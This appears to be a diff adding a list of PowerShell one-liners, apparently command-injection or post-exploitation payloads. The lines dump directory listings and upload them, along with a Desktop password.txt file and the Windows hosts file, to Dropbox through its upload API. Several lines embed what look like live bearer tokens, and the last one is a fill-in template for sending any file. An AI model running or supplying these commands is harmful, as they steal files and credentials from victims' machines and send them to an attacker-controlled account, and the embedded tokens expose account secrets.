@@ -1,1 +1,18 @@
-ifconfig
+
+/* dir output in file */
+& dir c:\Users\Public > c:\Users\Public\out.txt; 
+
+/* send output file to dropbox */
+& dir c:\Users\Public > c:\Users\Public\out.txt; $destFile = "/$(get-date -f yyyyMMddHHmm)_outfile.txt"; $rargs = '{ "path": "' + $destFile + '", "mode": "add", "autorename": true, "mute": false }'; $auth = "Bearer sl.Bd_y-EGIA3YWp-Q3rc4D72ePFbLKyg_ItXgtJhY1JP2c8vb19YcKBMS0QpIwHpROEIhAjnSmw0exqc6TqES9Ws6e8UIm9mpf10yo2d6Tw92u5-nMNyRjjnMFr1vLWwqK75Uy-Rk"; $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"; $headers.Add("Authorization", $auth); $headers.Add("Dropbox-API-Arg", $rargs); $headers.Add("Content-Type", 'application/octet-stream'); Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile c:\Users\Public\out.txt -Headers $headers
+
+/* send output file to dropbox new token */
+& dir $HOME\Desktop > c:\Users\Public\out.txt; $destFile = "/$(get-date -f yyyyMMddHHmm)_outfile.txt"; $rargs = '{ "path": "' + $destFile + '", "mode": "add", "autorename": true, "mute": false }'; $auth = "Bearer sl.BeBaMyJj7lTux0OnmsZwVsGAe3ANgqCNkInZNHZBr2WUUVRn1kYti2Cn4o3J9FdjR-L4t_I_ppfRuNGv0N-Ywas6gE2HqAfUa7eUmssAOdQlK20GF-mDADrUqkSR3HT-VD5VgGoBT5-M"; $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"; $headers.Add("Authorization", $auth); $headers.Add("Dropbox-API-Arg", $rargs); $headers.Add("Content-Type", 'application/octet-stream'); Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile "c:\Users\Public\out.txt" -Headers $headers
+
+/* send output file to dropbox new token */
+$destFile = "/$(get-date -f yyyyMMddHHmm)_outfile.txt"; $rargs = '{ "path": "' + $destFile + '", "mode": "add", "autorename": true, "mute": false }'; $auth = "Bearer sl.BeBaMyJj7lTux0OnmsZwVsGAe3ANgqCNkInZNHZBr2WUUVRn1kYti2Cn4o3J9FdjR-L4t_I_ppfRuNGv0N-Ywas6gE2HqAfUa7eUmssAOdQlK20GF-mDADrUqkSR3HT-VD5VgGoBT5-M"; $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"; $headers.Add("Authorization", $auth); $headers.Add("Dropbox-API-Arg", $rargs); $headers.Add("Content-Type", 'application/octet-stream'); Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile "$HOME\Desktop\password.txt" -Headers $headers
+
+/* send file to dropbox new token */
+$destFile = "/$(get-date -f yyyyMMddHHmm)_outfile.txt"; $rargs = '{ "path": "' + $destFile + '", "mode": "add", "autorename": true, "mute": false }'; $auth = "Bearer sl.BeBaMyJj7lTux0OnmsZwVsGAe3ANgqCNkInZNHZBr2WUUVRn1kYti2Cn4o3J9FdjR-L4t_I_ppfRuNGv0N-Ywas6gE2HqAfUa7eUmssAOdQlK20GF-mDADrUqkSR3HT-VD5VgGoBT5-M"; $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"; $headers.Add("Authorization", $auth); $headers.Add("Dropbox-API-Arg", $rargs); $headers.Add("Content-Type", 'application/octet-stream'); Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile "C:\Windows\System32\drivers\etc\hosts" -Headers $headers
+
+/* send file */
+$destFile = "/$(get-date -f yyyyMMddHHmm)_outfile.txt"; $rargs = '{ "path": "' + $destFile + '", "mode": "add", "autorename": true, "mute": false }'; $auth = "Bearer ***TOKEN***"; $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"; $headers.Add("Authorization", $auth); $headers.Add("Dropbox-API-Arg", $rargs); $headers.Add("Content-Type", 'application/octet-stream'); Invoke-RestMethod -Uri https://content.dropboxapi.com/2/files/upload -Method Post -InFile "$HOME\Desktop\***FILENAME***" -Headers $headers
